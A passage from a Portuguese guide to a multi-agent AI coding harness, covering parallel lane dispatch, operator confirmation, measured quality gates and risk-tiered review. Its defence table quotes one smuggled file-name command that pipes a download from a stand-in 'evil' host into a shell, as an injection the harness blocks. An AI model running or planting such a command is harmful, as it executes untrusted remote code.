        | Maintainability    | 5     | Todos ≤200 linhas, sem duplicação |
        | Handoff readiness  | 5     | STATE.md + handoff atualizados |

        Weighted average: 5.0 → ACCEPT

        [harness-clean-handoff]
        → feature_list.json: 6 features → passing
        → STATE.md: Current Active Work → feat-026 (filtro marca)
        → session-handoff.md: sessão de 6 iterações documentada
        → init.ps1 → OK
        → git status → 12 arquivos, todos intencionais
```

#### O que acontece por dentro (arquivos de estado)

```
feature_list.json — ANTES:
  feat-020: not_started
  feat-021: not_started
  ...

feature_list.json — DEPOIS (6 iterações):
  feat-020: passing, evidence: "curl search?q=gpu → 200, 12 results,
            ruff OK, pytest OK"
  feat-021: passing, evidence: "alembic upgrade head OK,
            GIN index em parts(name,description)"
  feat-022: passing, evidence: "SearchBar renderiza, typecheck OK,
            lint OK"
  feat-023: passing, evidence: "CategoryFilter + PriceRangeFilter
            wire no useSearch, filtrando corretamente"
  feat-024: passing, evidence: "SortDropdown funcional,
            sort_by=price, sort_order=asc testado"
  feat-025: passing, evidence: "Playwright: 5/5 pass,
            busca→filtro→ordenação E2E funciona"

docs/harness/sprint-contract.md:
  Preenchido ANTES do Execute com Scope In/Out, AC, Verification Plan
  Evidence Log populado durante as 6 iterações
  Sprint Log: 6 iterações registradas com timestamp

STATE.md:
  Decisions Log:
    2026-06-10 | GIN index em vez de ElasticSearch | Complexidade
                 desnecessária para escala atual
    2026-06-10 | Ordenação no backend (não no frontend) | Consistência
                 com paginação server-side
  Next Best Action: feat-026 — filtro por marca/fabricante

docs/harness/session-handoff.md:
  Verified Now: 6 features (feat-020 a feat-025), 12 arquivos
  Changed: backend (3 files), frontend (7 files), migrations (1),
           tests (1)
  Broken: none
  Next Best Step: feat-026
  Commands: init.ps1, pytest -k search, npm run test:e2e -- search
```

#### Skills usados (ordem)

```
harness-session-start       → orienta no início, declara WIP=1
harness-wip-control         → decompõe em 6 subtasks com dependências
harness-role-separation     → Planner → Generator → Evaluator
harness-evaluator-rubric    → rubrica task-specific do sprint contract
harness-termination-check   → 3-layer check em cada iteração
harness-continuity          → state machine entre iterações
harness-clean-handoff       → fecha após 6 features concluídas
```

**Tempo total:** ~30-45 minutos (6 iterações). **Arquivos tocados:** 12 código + 3 state files. **Features no feature_list.json:** 6 marcadas `passing` com evidência.

---

### 9.3 Tabela Comparativa: Pequena vs Grande

| Aspecto | Feature Pequena | Feature Grande |
|---|---|---|
| **Pipeline** | Quick mode (Specify → Execute → Verify) | Full (Specify → Design → Tasks → Execute) |
| **Skills** | 4 (session-start, wip-control, termination-check, clean-handoff) | 7 (+ role-separation, evaluator-rubric, continuity) |
| **Sprint Contract** | Não preenchido (implícito) | Preenchido antes do Execute |
| **Role Separation** | Não necessário | Planner → Generator → Evaluator |
| **Iterações** | 1 | 6 (uma por subtask) |
| **feature_list.json** | 1 feature → passing | 6 features → passing |
| **Arquivos tocados** | 1 código + 3 state | 12 código + 3 state |
| **Tempo** | 2-5 min | 30-45 min |
| **Gate de entrada** | Prompt ≤1 sentença, ≤3 arquivos | Prompt multi-componente, ambiguidade |

---

### 9.4 Dispatch Paralelo — spec-lead como Scheduler

**Quando usar:** feature com **lanes independentes** (arquivos disjuntos, sem dependência sequencial). O spec-lead vira o scheduler da fase Execute do PREVC (opção B) e despacha as lanes em paralelo, cada uma num subagent com model próprio. Sem lanes independentes, use o fluxo normal (§9.1 / §9.2) — paralelismo não ajuda.

**Setup (uma vez por sessão):**
```powershell
& "$env:USERPROFILE\.config\opencode\scripts\start-parallel.ps1"
# seta OPENCODE_EXPERIMENTAL_BACKGROUND_SUBAGENTS=true + PARALLEL=true
# abre: opencode --port 4096 --agent spec-lead
```
> Sem os env flags, o dispatch é **serial** — o script garante os dois.

> ⚠️ **Cuidado com o stub de background (fix 2026-08-10).** Com esses flags,
> `task(background:true)` retorna **na hora** um stub `<task state="running">Background task
> started… you will be notified… DO NOT poll or duplicate…</task>`. Esse stub **não é o
> resultado** (sem edits/evidência). O spec-lead foi endurecido pra **nunca** tratar o stub como
> resultado nem rerotear/duplicar uma lane com `task_status` ainda `running` — só reconcilia em
> estado terminal, lendo o relatório final do filho. Se o background falhar (o stub nunca vira o
> resultado real), use **`start-serial.ps1`** (flags OFF): `task()` bloqueia e devolve o
> relatório real — confiável, mas sem paralelismo. Modelos lentos (ex.: `deepseek-v4-flash max`,
> ~4–5 min/lane) **agravam** a corrida por alargar a janela do stub.
>
> **Modelos (2026-08-12):** três agentes são pagos (`gpt-5.6-sol medium`): `spec-lead`, `refiner`
> (o segundo pago, v1.3) e `rule-verifier` (o terceiro, D21); os outros 18 rodam
> `opencode-go/deepseek-v4-flash` em `max` (effort válido nesse lane: `low/high/max`; `xhigh` não).
> `code-reviewer` agora tem `bash: deny` — "reviewers nunca escrevem" era falso como configurado, e
> v1.3 depende disso.

**Auto mode (padrão para executar um plano nomeado):**
```
1. start-parallel.ps1                        → abre no spec-lead
2. "Execute all tasks in plan <path> ..."    → a instrução AUTORIZA o run inteiro
   → planeja as lane tables, executa tudo até o fim, para UMA vez no final
3. (no fim) awaiting_confirmation             → tu revisa e confirma
```
> **Sem `/prevc run`, sem approval no meio.** Uma instrução pra executar um plano
> nomeado de ponta a ponta é ela mesma a autorização do run autônomo. Roda do prompt
> até o fim sozinho e para **uma vez só**, no `awaiting_confirmation` do spec inteiro.
> Para no meio só por bloqueio real (task que exige operador/live, scope change,
> push/deploy, ou falha de validação irrecuperável).

**Modo manual (trabalho ad-hoc, não um plano nomeado):**
```
1. start-parallel.ps1   → abre no spec-lead
2. pede o trabalho      → propõe o plano, para em awaiting_plan_approval
3. "aprovado"           → sinaliza
4. /prevc run           → autoriza o Execute
```
> `/prevc run` continua sendo o autorizador quando tu **não** deu uma instrução de
> executar um plano inteiro. Pra plano nomeado (auto mode), não precisa.

#### Receita pronta (copiar e colar)

**1. Abrir a sessão** (no diretório do projeto):
```powershell
& "$env:USERPROFILE\.config\opencode\scripts\start-parallel.ps1"
# segundo projeto ao mesmo tempo: adicione -Port 4097 -Dir "C:\outro\projeto"
```

**2. Passar o plano** — template reutilizável, troca só o caminho. A instrução já
autoriza o run inteiro; ele roda até o fim e para uma vez no `awaiting_confirmation`:
```text
Execute all tasks in plan agent-os/specs/<PASTA-DO-PLANO> end to end under PREVC —
this authorizes a full autonomous run.
Propose a lane table per phase; parallelize independent lanes,
serialize lanes sharing a file. Use recommended subagents.
When all tasks land, run @code-reviewer and @architecture-reviewer in parallel
over the diff; both must score 9+ with zero critical/blocking issues.
Stop only at the final awaiting_confirmation for the whole spec.
```

**3. Confirmar no fim** — quando todo o plano terminou, ele para em
`awaiting_confirmation` com os arquivos mudados e a evidência. Tu revisa e confirma.

> **Plano com gates de operador/live** (máquina física, credencial, tráfego real):
> o run autônomo **para sozinho** ao bater no primeiro gate de operador e reporta
> `blocked`. Pra ser explícito, troca a 1ª linha por `Execute only the
> agent-implementable tasks... and STOP at <Task N>`. Ex: OEM para na Task 5.
> Plano sem gates (ex: Area Bindings) roda inteiro sem parar.
>
> Reviewer segundo o plano: usa o par que o `plan.md` do teu spec manda na task de
> review final. Se o plano não diz, `code-reviewer` + `architecture-reviewer`.

**Prompt do usuário:** `Adiciona página de comparação de props: card de UI, endpoint de agregação no backend, e testes dos dois.`

**Classificação:** MEDIUM, 3 lanes disjuntas → **dispatch paralelo.**

#### O que o usuário vê (por fora)

```
Usuário: Adiciona página de comparação de props: card de UI,
         endpoint de agregação no backend, e testes dos dois.

spec-lead (gpt-5.6-sol/high):
  [PREPARE — role de planning]
  Antes de despachar, mapeio ownership de arquivo por lane.
  Despacho @explorer (read-only) pra confirmar convenções e call sites.

  → @explorer (deepseek-flash/low): retorna file:line dos readers de
    frontend_*.json e a convenção de erro em src/providers/

  LANE TABLE (instrução de executar o plano = run autorizado):
  ┌──────┬─────────────────────────┬──────────────────────────────┬──────────┬──────────────────────┐
  │ Lane │ Objetivo                │ Ownership (arquivos)         │ Dep      │ Capability           │
  ├──────┼─────────────────────────┼──────────────────────────────┼──────────┼──────────────────────┤
  │ L1   │ Card de comparação      │ frontend-next/.../Compare.tsx│ —        │ vue-engineer/fixer   │
  │ L2   │ Endpoint de agregação   │ src/analysis/compare.py      │ —        │ fixer                │
  │ L3   │ Testes L1+L2            │ tests/test_compare.py        │ L1, L2   │ test-automation-eng  │
  └──────┴─────────────────────────┴──────────────────────────────┴──────────┴──────────────────────┘
  Risco: MEDIUM. Ownership disjunto entre L1 e L2 → paralelizam.
  L3 depende de L1+L2 → roda depois. Verificação: npm run build; pytest.

  [EXECUTE — role de scheduler, sem parar pra aprovação]
  Despacho L1 e L2 em paralelo (task background: true), registro task IDs.

  → task(fixer, L2)      → id=t_a1  [running]
  → task(fixer, L1)      → id=t_b2  [running]

  [poll task_status: t_a1 running, t_b2 running...]
  [t_a1 → completed]  L2: compare.py criado, pytest do módulo passou
  [t_b2 → completed]  L1: Compare.tsx criado, npm run build OK

  L1+L2 terminais → despacho L3 (dep satisfeita).
  → task(test-automation-engineer, L3)  → id=t_c3  [running]
  [t_c3 → completed]  L3: test_compare.py, 8 passed 0 failed

  RECONCILE + verificação cross-lane:
  [npm run build → OK]  [pytest → 31 passed]  [.\init.ps1 → sai 0]

  Devolvo o resultado reconciliado ao PREVC Validate.

PREVC: Validate → Judge → awaiting_confirmation
  Muda: 3 arquivos código. Evidência: build OK, pytest 31/0, init.ps1=0.

Usuário: confirmo
  → feature_list.json: feat-XXX → passing
  → [harness-clean-handoff]
```

#### Regras que o scheduler obedece

- **Um arquivo, uma lane write-capable por vez.** Lanes com ownership que se cruza **não** são independentes — serializa ou funde numa lane. (Ownership não é lock — é regra de prompt. Colisão = sobrescrita silenciosa.)
- **Task ID registrado na hora.** Lane sem task ID = trabalho fora do radar, não existe.
- **`task_status` é grosso:** só `running | completed | cancelled`, sem output parcial. Pra assistir um worker ao vivo, noutro pane: `opencode attach http://127.0.0.1:4096 --session <childId>`.
- **Sem `ask` em background.** Subagents rodam com `permission` só `allow`/`deny` (config em `opencode.jsonc`); um `ask` penduraria a lane esperando aprovação que ninguém vê. Permission por agente **ganha** do global do plugin.
- **Scope change volta pro PREVC.** O scheduler nunca absorve mudança de escopo no dispatch — para como `blocked`/`needs_input` e devolve pro operador.
- **Nada de commit/push/deploy automático**, em nenhum nível de risco.

#### Agentes disponíveis (roteados pelo spec-lead)

Modelo e permissão de cada um são fixados em `opencode.jsonc`. Implementadores
editam; reviewers e advisors são read-only.

| Agente | Papel | Modelo / variant | edita? |
|---|---|---|---|
| `spec-lead` | Scheduler + planejamento | gpt-5.6-sol / medium (pago) | não |
| `refiner` | Refine phase — lê a janela, propõe, nunca escreve | gpt-5.6-sol / medium (pago) | não |
| `rule-verifier` | Refuta candidatos prose-`observe` (D21) | gpt-5.6-sol / medium (pago) | não |
| `explorer` | Recon read-only | deepseek-v4-flash / max | não |
| `fixer` | Lane escopada genérica | deepseek-v4-flash / max | sim |
| `python-engineer` | FastAPI, SQLAlchemy, async, pytest | deepseek-v4-flash / max | sim |
| `vue-engineer` | Vue 3, TS, Pinia, Vite/Nuxt | deepseek-v4-flash / max | sim |
| `postgres-engineer` | Schema, migrations, locking, concorrência | deepseek-v4-flash / max | sim |
| `kotlin-engineer` | Android, KMP, Compose | deepseek-v4-flash / max | sim |
| `backend-infra-engineer` | Docker, CI, config, preflight, deploy | deepseek-v4-flash / max | sim |
| `web-platform-engineer` | Cross-browser, build, Core Web Vitals | deepseek-v4-flash / max | sim |
| `test-automation-engineer` | Testes + diagnóstico | deepseek-v4-flash / max | sim |
| `code-reviewer` | Gate final: linha, segurança, qualidade | deepseek-v4-flash / max — **`bash: deny`** (review B5) | não |
| `architecture-reviewer` | Gate final: estrutura, coupling, seams | deepseek-v4-flash / max | não |
| `security-analyst` | Testing autorizado (wstg/redteam/recon) | deepseek-v4-flash / max | não |
| `system-design-advisor` | Design de sistema (APIs, filas, escala) | deepseek-v4-flash / max | não |
| `architecture-advisor` / `design-*` / `plan-architect` / `requirements-interrogator` | Advisory de planejamento | deepseek-v4-flash / max | não |

**Gate final duplo:** ao terminar as tasks, o scheduler despacha `code-reviewer`
e `architecture-reviewer` **em paralelo** sobre o diff. Ambos emitem nota `/10`.
Ambos ≥9 com zero crítico/blocking → recomenda aprovação ao PREVC; **o operador
confirma**. Os agentes **pontuam**, não aprovam — o carimbo final é teu. Para
mudança system-level (serviço/fila/API novos), usa `system-design-advisor` como
segundo gate no lugar do architecture-reviewer.

#### Quando NÃO usar

- Lanes que tocam o mesmo arquivo → serial (§9.2).
- Feature de 1 arquivo → quick mode (§9.1). Overhead de scheduler não compensa.
- Ctrl+C no spec-lead **não** mata os filhos em background — cancela via `cancel_task`/`task_status` ou fecha o pane do worker.

#### Troubleshooting

| Sintoma | Causa | Fix |
|---|---|---|
| spec-lead parou esperando aprovação | trabalho ad-hoc, não instrução de plano nomeado | `/prevc run`, ou reformula como "Execute all tasks in plan `<path>` end to end" |
| 2º opencode não sobe | port 4096 ocupado | `-Port 4097` no script |
| workers em série, não paralelo | abriu opencode cru, sem env flag | usa o `start-parallel.ps1` |
| subagent "returned without edits/evidence" + reroteia/duplica em loop | scheduler leu o **stub** de background como resultado de uma lane ainda `running` | spec-lead já endurecido; se persistir, roda em serial com `start-serial.ps1` (task() bloqueia e devolve o resultado real) |
| lane volta `blocked: file outside ownership` | scope change | volta pro plano, re-aprova |
| tudo lento / erro de quota | lanes demais ou 2 schedulers | menos paralelo / 1 projeto por vez |
| worker esperando pra sempre | permission `ask` num agente de background | troca pra `allow`/`deny` no jsonc |
| Ctrl+C não parou os workers | filhos sobrevivem ao pai | `cancel_task` ou fecha o pane |

---

### 9.5 Guia de Roteamento — Escolhendo o Fluxo PREVC

Antes de pedir qualquer trabalho, escolha o fluxo. A tabela abaixo roteia os nove casos típicos; as
subseções seguintes dão o prompt pronto, o comportamento esperado de gate/aprovação e os erros
comuns de cada um.

**Vocabulário PREVC usado aqui:** tickets são **lanes** (cada lane é um ticket com ownership de
arquivos); **run autônomo de plano nomeado** = a instrução *"Execute all tasks in plan
`<caminho>` end to end"* autoriza o run inteiro; **um writer por arquivo** = um arquivo tem no
máximo uma lane write-capable por vez; **review final duplo** = `code-reviewer` +
`architecture-reviewer` em paralelo sobre o diff; **`awaiting_confirmation`** = a parada única do
run; **sem approval por task** = nenhuma aprovação no meio do run.

#### Tabela de roteamento

| # | Caso | Classificação | Fluxo | Onde roda | Para em | Gate/approval esperado |
|---|---|---|---|---|---|---|
| 9.5.1 | Tarefa simples de um arquivo | SMALL | Quick mode (Specify → Execute → Verify) | sessão normal | fim, com evidência | sem lane table; operador vê diff + evidência |
| 9.5.2 | Bug fix pequeno | SMALL + regressão | Quick mode + teste de regressão | sessão normal | fim, com evidência | regressão é blocking (v1.2); sem teste, gate falha |
| 9.5.3 | Feature complexa | COMPLEX | Plano nomeado, pipeline completo | spec-lead | `awaiting_confirmation` | review final duplo; operador confirma uma vez |
| 9.5.4 | Tasks independentes | MEDIUM/COMPLEX | Dispatch paralelo, lanes disjuntas | spec-lead + `start-parallel.ps1` | `awaiting_confirmation` | review final duplo; sem approval por task |
| 9.5.5 | Tasks dependentes | COMPLEX | Dispatch serializado, blocking edges | spec-lead | `awaiting_confirmation` | review final duplo; dep só despacha com upstream terminal |
| 9.5.6 | Trabalho multi-sessão | qualquer | WIP=1 + `harness-continuity` + handoff | sessões sucessivas | fim de cada sessão | clean handoff a cada sessão; retoma de STATE.md |
| 9.5.7 | Mudança high-risk/security | ALTO RISCO | Risk router tier `full` | spec-lead | `awaiting_confirmation` | review full + `security-analyst` + humano lê |
| 9.5.8 | Mudança docs-only | SMALL | Quick mode, só docs | sessão normal | fim, com evidência | `--check-sources`; nada de threshold em prosa |
| 9.5.9 | Ciclo Refine/regra aprendida | v1.3 | Judge → `/refine` → `awaiting_confirmation` | spec-lead | `awaiting_confirmation` | texto literal renderizado; operador aprova regras blocking |

---

#### 9.5.1 Tarefa simples de um arquivo

**Quando usar:** 1 arquivo de código, escopo óbvio, sem ambiguidade. Scheduler é overhead aqui.

**Prompt (copiar e colar):**
```text
Adiciona <mudança> em <arquivo>. AC: <comando> passa. Fora de escopo: <o que NÃO fazer>.
```

**O que acontece:** quick mode direto na sessão — Specify → Execute → Verify. Evidência real
(output do comando, não descrição). Sem lane table, sem dispatch, sem approval no meio. O operador
revisa o diff e a evidência no final.

**Erros comuns:** usar scheduler para 1 arquivo (overhead sem benefício); declarar "pronto" sem
rodar o comando; tocar arquivos fora do escopo na mesma sessão (adjacente vira `not_started`).

#### 9.5.2 Bug fix pequeno

**Quando usar:** bug com causa localizada. Regressão é obrigatória — v1.2 nasce `blocking`: bug fix
sem teste de regressão falha o gate.

**Prompt (copiar e colar):**
```text
Corrige <bug> em <arquivo> (causa: <uma linha de diagnóstico>). Adiciona teste de regressão em
<arquivo-de-teste>. AC: <comando de teste> passa e o teste novo falha sem a correção.
```

**O que acontece:** quick mode + teste que falha antes e passa depois. O gate local bloqueia se a
mudança parece bug fix e nenhum arquivo de teste foi tocado. Evidência: output antes/depois.

**Erros comuns:** corrigir sem reproduzir o bug primeiro; esquecer o teste de regressão (gate
falha); "diagnosticar" por palpite em vez de rodar o comando que falha.

#### 9.5.3 Feature complexa

**Quando usar:** multi-componente, frontend + backend, ambiguidade, decisões de design. Usa plano
nomeado (spec Agent OS em `agent-os/specs/<data-hora-slug>/`) e pipeline completo.

**Prompt (copiar e colar):**
```text
Execute all tasks in plan agent-os/specs/<PASTA-DO-PLANO> end to end under PREVC — this authorizes
a full autonomous run.
Propose a lane table per phase; parallelize independent lanes, serialize lanes sharing a file.
Use recommended subagents.
When all tasks land, run @code-reviewer and @architecture-reviewer in parallel over the diff; both
must score 9+ with zero critical/blocking issues.
Stop only at the final awaiting_confirmation for the whole spec.
```

**O que acontece:** spec-lead planeja (lane table com ownership e dep), executa, roda o gate,
review final duplo e para **uma vez** em `awaiting_confirmation` — nunca a cada task. O operador
revisa diff + evidência e confirma. Plano com gate de operador/live: o run para sozinho no gate e
reporta `blocked`.

**Erros comuns:** aprovar no meio do run (não há o que aprovar — sem approval por task); misturar
trabalho ad-hoc com plano nomeado (ad-hoc para em `awaiting_plan_approval` e exige `/prevc run`);
plano sem AC mensurável por lane.

#### 9.5.4 Tasks independentes — parallel lanes

**Quando usar:** 2+ tickets com arquivos **disjuntos** (um writer por arquivo). Setup uma vez por
sessão: `start-parallel.ps1` (flags de background ON).

**Prompt:** o mesmo template do 9.5.3 — o scheduler paraleliza as lanes independentes sozinho.

**O que acontece:** lanes independentes despacham em paralelo (`task(background:true)`), task IDs
registrados na hora, scheduler reconcilia **só estados terminais** (nunca trata o stub de background
como resultado), verificação cross-lane no fim, review final duplo, parada única em
`awaiting_confirmation`.

**Erros comuns:** paralelizar lanes que compartilham arquivo (sobrescrita silenciosa — ownership é
regra de prompt, não lock); abrir opencode cru sem os flags (vira serial); scheduler reler o stub e
rerotear lane ainda `running` (se persistir, serial com `start-serial.ps1`).

#### 9.5.5 Tasks dependentes — serialized blocking edges

**Quando usar:** tickets com dependência explícita (ex.: backend → frontend → testes).

**Prompt:** o template do 9.5.3 com a coluna `Dep` preenchida na lane table:
```text
Lane table (Dep):
  L1 backend endpoint      (dep: —)
  L2 frontend consome      (dep: L1)
  L3 testes E2E            (dep: L1, L2)
```

**O que acontece:** L1 roda; L2 só despacha quando L1 está **terminal** (completed/cancelled, com
relatório real); L3 depois de L2. Nenhuma aprovação entre as ondas (sem approval por task). Para no
`awaiting_confirmation` final. Se uma dep falha, o scheduler para como `blocked` e reporta — não
"conserta" fora do escopo.

**Erros comuns:** despachar lane dependente antes do upstream terminar; tratar upstream lento como
`blocked` (é `running`, não `blocked`); absorver scope change no dispatch (devolve ao plano/operador).

#### 9.5.6 Trabalho multi-sessão

**Quando usar:** trabalho que não cabe numa sessão (longo, ou com gate de operador no meio).

**Prompt:** nenhum especial — o harness força por estado: `harness-session-start` no início e
`harness-clean-handoff` no fim de **cada** sessão.

**O que acontece:** WIP=1 persiste em `feature_list.json`/STATE.md; `session-handoff.md` registra o
que foi feito/quebrou/próximo passo; a próxima sessão retoma **só lendo os arquivos**. Se a sessão
termina com trabalho incompleto, **ainda** faz handoff: lane → `blocked` com razão exata e Next
Best Step.

**Erros comuns:** terminar a sessão sem handoff ("vou lembrar amanhã"); não marcar a lane bloqueada
com a causa; re-planejar do zero na sessão nova em vez de retomar do estado.

#### 9.5.7 Mudança high-risk / security

**Quando usar:** paths de risco (auth, pagamentos, senhas, migração de DB, YAML de infra,
permissões) ou mudança system-level (serviço/fila/API novos). Risco **curto-circuita**: nenhum
número verde compra atalho ali.

**Prompt:** plano nomeado com nota de risco explícita:
```text
Execute all tasks in plan <PASTA-DO-PLANO> end to end — this authorizes a full autonomous run.
This change touches <auth/...>: treat it as high risk; use tier full review.
```

**O que acontece:** risk router computa tier `full` → review completo + `security-analyst` + **o
humano lê**. O gate falha fechado: report ausente, obsoleto ou exit 2 → tier `full`.
`harness-ship-evidence` recusa emitir com gate vermelho ou obsoleto. Para em `awaiting_confirmation`;
quem confirma é o operador.

**Erros comuns:** achar que gate verde permite pular o review humano em path de risco; commitar sem
o trailer do gate (ship-evidence recusa); pedir tier `auto` para mudança que mexe em
permissão/auth.

#### 9.5.8 Mudança documentation-only

**Quando usar:** só docs (ex.: este guia). Nenhum código muda.

**Prompt (copiar e colar):**
```text
Atualiza <doc> com <o que>. Preserva o conteúdo técnico existente; não altera thresholds nem
contagens de teste; não afirma aceitação live que não aconteceu.
```

**O que acontece:** quick mode; verificação é o gate local + `--check-sources` (invariante 13:
número governante pertence ao `quality-thresholds.json`, não à prosa — um limiar escrito em doc é
achado do check-sources). Evidência: output real dos comandos. Docs que descrevem regras seguem a
mesma disciplina do rulebook.

**Erros comuns:** escrever limiar numérico em prosa (check-sources falha); editar
`quality-thresholds.json` "só para documentar"; afirmar estado de aceitação que não aconteceu
(ex.: live acceptance C1–C16).

#### 9.5.9 Ciclo Refine / regra aprendida

**Quando usar:** review aponta violação repetida de uma regra escrita; o operador quer que a
próxima run injete a regra no dispatch da lane.

**Fluxo:** gate → trailer (incl. `Adherence:`) → **CODE COMMIT** → Judge → `/refine` →
`awaiting_confirmation` (proposta renderizada como texto literal) → operador confirma → **prosa em
commit separado** do rulebook → próxima run injeta a regra.

**O que acontece:** o `refiner` (read-only por permissão) lê a janela de findings e propõe **no
máximo 1 proposta por componente por run**; não escreve nada e **não tem voto** no veredito. Regra
blocking / high_risk_path: o operador aprova vendo o **texto literal**. Prose-`observe`: o
`rule-verifier` (distinto, top-tier) pode refutar; a auto-activação está **desligada**
(`auto_activate_prose_observe: false`) — opt-in por projeto, só depois de live acceptance (tabela
C, C1–C16 — **não rodada**) e restart do OpenCode. `/refine --note` registra correção manual do
operador com peso próprio.

**Erros comuns:** escrever prosa de regra junto com o commit de código (estala o `sourceHash` e o
ship-evidence recusa — a ordem prosa-depois-do-commit é estrutural); tratar proposta renderizada
como aprovada (renderização é o prompt de confirmação, não a aprovação); rodar o refiner no tier
mais barato; afirmar que live acceptance rodou ou que a auto-activação está ligada.

---

## 10. Matriz de Completude

### Estado atual do projeto Hardware Pulse

| Layer | Artefato | Status |
|---|---|---|
| **Entry** | `AGENTS.md` — `## Harness` como 1ª seção | ✅ Complete |
| **Entry** | `AGENTS.md` — trim para ≤200 linhas | ⏸ Deferred (precisa de context layer) |
| **Context** | `ARCHITECTURE.md`, `PRODUCT.md`, `RELIABILITY.md` | ⏸ Deferred (adicionar quando complexidade crescer) |
| **State** | `feature_list.json` — 12 features, todas `passing` | ✅ Complete |
| **State** | `.specs/project/STATE.md` | ✅ Complete |
| **State** | `docs/harness/session-handoff.md` | ✅ Complete |
| **State** | `docs/harness/sprint-contract.md` | ✅ Complete |
| **Feedback** | `init.ps1` | ✅ Complete |
| **Feedback** | `zharnessengineering/index.md` | ✅ Complete |
| **Evaluation** | `agent-os/judges/harness-judge.md` | ✅ Complete |
| **Skills** | 11 skills em `.opencode/skills/harness-*/` + globais relevantes | ✅ Complete |

### Skills Criados

| # | Skill | Linhas |
|---|---|---|
| 1 | `harness-session-start` | 27 |
| 2 | `harness-clean-handoff` | 25 |
| 3 | `harness-wip-control` | 27 |
| 4 | `harness-termination-check` | 25 |
| 5 | `harness-initializer` | 31 |
| 6 | `harness-readable-workspace` | 27 |
| 7 | `harness-continuity` | 28 |
| 8 | `harness-feature-state` | 44 |
| 9 | `harness-evaluator-rubric` | 33 |
| 10 | `harness-role-separation` | 41 |
| 11 | `harness-context-layer` | global — audita ARCHITECTURE.md, PRODUCT.md, RELIABILITY.md |

---

## 12. Gate Medido e Risk Router (v1.2)

Antes de v1.2 a barra de aprovação do harness eram **duas notas 0–10 inventadas por um modelo** —
`code-reviewer` e `architecture-reviewer` em paralelo, nenhum recebendo número medido, os dois no
modelo mais barato da matriz. Tudo abaixo disso (Judge, commit, handoff) herdava um palpite.

v1.2 não adiciona uma camada ao lado: troca **a entrada** desses gates.

### `/quality` — uma linha de comando, dois números

```bash
/quality              # --mode local: coverage, complexidade, tamanho de módulo, security, boundaries, regressão
/quality full         # + mutação e e2e — só o scheduler, uma vez, antes do commit único
```

Sai uma tabela e um exit code: `0` passou/observando · `1` métrica bloqueante vermelha · `2` **o
gate quebrou** (blocker de harness, nunca "o código falhou").

Thresholds ficam em `agent-os/quality-thresholds.json`, por projeto. Afrouxar exige linha datada em
`quality-decisions.md` — o gate compara contra o merge-base e recusa afrouxamento silencioso.

### Os quatro tipos de teste

Coverage prova que a linha rodou. **Mutação prova que o teste asserta.** Regressão prova que um bug
corrigido continua corrigido. E2E prova que o sistema montado funciona. Coverage é piso; mutação é o
alvo, em ratchet. Regressão é a única métrica que já nasce `blocking`: **bug fix sem teste de
regressão falha o gate.**

### Profundidade de review por risco

| Tier | Quando | Profundidade |
|---|---|---|
| `auto` | risco baixo · complexidade baixa · gate verde | ninguém lê o diff. Gate é a evidência; operador confirma |
| `sampling` | complexidade média · gate verde | lê só os N hunks mais arriscados, e **diz** "revisei 3 de 11" |
| `full` | path de risco, complexidade alta, ou gate vermelho | review completo + `security-analyst` + humano lê |

Risco vem de **paths** (auth, pagamentos, senhas, migração de DB, YAML de infra, permissões) e
curto-circuita: nenhum número verde compra atalho ali. Complexidade é pontuada por fatos do diff.
`untrusted` nunca é computado — é procedência, declarada pelo operador.

**O gate falha fechado.** Report ausente, obsoleto, `unconfigured` ou exit 2 → tier `full`. Gate
quebrado nunca pode comprar *menos* review do que v1.1 dava.

### Evidência que viaja

O commit ganha trailer (`Quality-Gate:` / `Metrics:` / `Risk-Tier:` / `Gate-Report:`) — então
`git log --grep=Quality-Gate` é o histórico de qualidade do projeto de graça. O corpo do PR ganha a
tabela, o tier e o checklist de pontos cegos. `harness-ship-evidence` **se recusa a emitir** com gate
vermelho ou obsoleto: é aí que "commit aprovado só com gate decente" fica estrutural. Push, merge e
git remoto seguem manuais.

### Rollout em 3 fases

**A — observe:** tudo reporta, nada bloqueia (exceto regressão). Coleta baseline real.
**B — bloqueia o tier fácil:** thresholds vindos dos baselines da fase A, métricas locais em
`blocking`, tier `auto` habilitado.
**C — gate completo:** mutação em ratchet, write-back e propostas de aperto ligadas.

Não pule a fase A. Threshold aspiracional definido antes de medir é o caminho mais rápido para um
gate que todo mundo desativa.

### O que o gate NÃO vê

Correção de lógica de negócio, se a feature **certa** foi construída, race conditions, loops sem
limite que não têm cara de N+1, memory leak, lógica de autorização, encaixe idiomático, direção
arquitetural. Essa lista mora em `docs/review.md` de cada projeto e cresce com o que escapou. É onde
a atenção liberada pelo gate deve cair — o argumento nunca foi "pare de pensar no código".

### O gate verifica os próprios artefatos

Essa foi a lição mais cara da construção, e vale saber antes de estender o sistema. Cinco rodadas de
review acharam **a mesma direção de erro cinco vezes**: a verificação fechada numa camada e aberta na
de baixo. Report verificado → o guard que lê o report não → a fonte do guard não → a referência da
fonte não → chave nova de config não.

O que ficou, e por quê:

| Defesa | O que ela impede |
|---|---|
| Git por argv, `shell:false`, `-z`, `--` antes de path | um arquivo chamado `foo;curl evil\|sh;package.json` executando código |
| `assessReport`: hash presente **e** casando, `rows` não-vazio, cobertura de métrica | um JSON de cinco campos lendo como gate verde |
| Fingerprint da config **inteira** (+ bucket para chave desconhecida) | `suites.regression.command → exit 0` desligando a única métrica bloqueante |
| Config dentro do `sourceHash`, em forma canônica sem `baseline` | remover `**/auth/**` depois de um gate verde e perder a revisão obrigatória |
| Barra anterior = a **mais estrita** entre HEAD commitado e reports | baseline afrouxado à mão, e forja do report *anterior* (mais barata que a do atual) |
| `resolveInsideRoot` no `--review` | arquivo fora do repo satisfazendo o tier `full` |
| `reviewApproves` | um review dizendo REQUEST CHANGES satisfazendo o tier `full` |

**Limites declarados, não fechados:** o `sourceHash` prova frescor, não autoria — quem tem escrita na
árvore e roda o gate produz report com hash correto. E o guard é relativo ao HEAD, então branch órfã
ou raiz reescrita escapa. O gate defende contra **descuido** e **erosão silenciosa**, que é o problema
real, não contra um atacante com commit.

Vereditos finais do próprio gate duplo sobre esta mudança: `code-reviewer` **9/10**,
`architecture-reviewer` **9/10**, `security-analyst` **CLEAR** — depois de 54 achados aceitos.

Detalhes, matriz de ferramentas por stack e as invariantes 7–15: `docs/harness/measured-gates.md` e
`docs/harness/v1.2-context.md`.

---

## 13. Refine e Regras Aprendidas (v1.3)

v1.2 mede o **artefato**; v1.3 mede o **agente**: qual regra escrita foi quebrada, em qual lane, se o
reviewer consegue citar uma regra, e quanto do rulebook um programa verifica. O write-back de prosa do
v1.2 morreu — um **registro tipado** o substitui, e o loop fecha na **injeção no dispatch**, não no
